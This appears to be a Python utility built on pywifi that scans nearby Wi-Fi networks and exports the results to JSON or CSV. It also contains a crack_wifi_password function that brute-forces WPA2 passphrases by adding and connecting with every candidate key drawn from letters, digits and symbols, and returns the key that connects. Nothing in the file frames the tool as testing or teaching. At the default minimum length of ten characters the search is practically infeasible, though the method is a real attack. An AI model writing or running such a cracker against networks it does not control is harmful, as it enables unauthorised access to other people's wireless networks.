import pywifi
from pywifi import PyWiFi, const, Profile
import time
import itertools
import string
import csv
import json

def get_interfaces():
    wifi = PyWiFi()
    ifaces = wifi.interfaces()
    return [iface.name() for iface in ifaces]

def detect_wifi_interface():
    interfaces = get_interfaces()
    for iface in interfaces:
        if "wi-fi" in iface.lower() or "wlan" in iface.lower() or "wireless" in iface.lower():
            return iface
    return None

def scan_wifi(interface_name):
    wifi = PyWiFi()
    iface = None
    for i in wifi.interfaces():
        if i.name() == interface_name:
            iface = i
            break

    if iface is None:
        print(f"Interface {interface_name} not found")
        return []

    iface.scan()
    time.sleep(5)
    scan_results = iface.scan_results()
    
    wifi_networks = []
    for network in scan_results:
        ssid = network.ssid
        bssid = network.bssid
        signal = network.signal
        frequency = network.freq
        wifi_networks.append({'SSID': ssid, 'BSSID': bssid, 'Signal': signal, 'Frequency': frequency})
        # print(f"Detected network: SSID={ssid}, BSSID={bssid}, Signal={signal}, Frequency={frequency}")

    return wifi_networks

def block_wifi(bssid):
    print(f"Block Wi-Fi with BSSID: {bssid}")

def crack_wifi_password(ssid, bssid, update_callback, charset=string.ascii_letters + string.digits + string.punctuation, min_length=10, max_length=22, delay=1):
    wifi = PyWiFi()
    iface = wifi.interfaces()[0]

    total_attempts = sum(len(charset) ** length for length in range(min_length, max_length + 1))
    attempt_counter = 0

    for length in range(min_length, max_length + 1):
        for password in itertools.product(charset, repeat=length):
            password = ''.join(password)
            profile = Profile()
            profile.ssid = ssid
            profile.auth = const.AUTH_ALG_OPEN
            profile.akm.append(const.AKM_TYPE_WPA2PSK)
            profile.cipher = const.CIPHER_TYPE_CCMP
            profile.key = password
            
            iface.remove_all_network_profiles()
            tmp_profile = iface.add_network_profile(profile)
            
            iface.connect(tmp_profile)
            time.sleep(delay)
            
            attempt_counter += 1
            progress = (attempt_counter / total_attempts) * 100
            update_callback(password, progress)

            if iface.status() == const.IFACE_CONNECTED:
                iface.disconnect()
                return password
    
    return None

def save_scan_results(results, filename):
    with open(filename, 'w') as f:
        json.dump(results, f)

def load_scan_results(filename):
    with open(filename, 'r') as f:
        return json.load(f)

def export_to_csv(results, filename):
    with open(filename, 'w', newline='') as f:
        writer = csv.writer(f)
        writer.writerow(['SSID', 'BSSID', 'Signal', 'Frequency'])
        for network in results:
            writer.writerow([network['SSID'], network['BSSID'], network['Signal'], network['Frequency']])

if __name__ == "__main__":
    interface = detect_wifi_interface()
    if interface:
        print(f"Usando la interfaz detectada: {interface}")
        networks = scan_wifi(interface)
        for network in networks:
            print(f"SSID: {network['SSID']}, BSSID: {network['BSSID']}, Signal: {network['Signal']}, Frequency: {network['Frequency']}")
    else:
        print("No se detectó ninguna interfaz Wi-Fi. Por favor, seleccione una interfaz manualmente.")
